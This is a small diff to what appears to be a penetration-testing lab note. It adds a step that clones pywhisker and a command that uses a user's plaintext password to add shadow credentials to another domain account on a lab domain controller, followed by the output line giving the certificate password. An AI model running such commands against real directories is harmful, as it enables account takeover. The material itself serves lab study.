@@ -1,5 +1,6 @@
 # generating x.509 cert
 ```
+git clone https://github.com/ShutdownRepo/pywhisker.git && cd pywhisker/pywhisker
 pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
 ```
 >[i] Passwort für PFX: bmRH4LK7UwPrAOfvIx6W  
